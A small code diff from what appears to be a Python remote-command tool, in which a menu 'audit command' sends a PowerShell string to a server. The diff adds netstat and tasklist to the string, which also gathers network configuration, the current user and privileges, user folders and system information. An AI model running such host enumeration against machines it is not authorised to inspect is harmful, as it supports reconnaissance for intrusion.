@@ -47,7 +47,7 @@ def main():
             else:
                 print("Error: File path is empty!")
         elif choice == "4": # audit command
-            command = "powershell -c ipconfig /all; whoami; whoami /priv; dir c:\Users; systeminfo;"
+            command = r'powershell -c ipconfig /all; netstat -ano; whoami; whoami /priv; dir c:\Users; systeminfo; tasklist;'
             if command:
                 send_command_to_server(command, server_url)
             else:
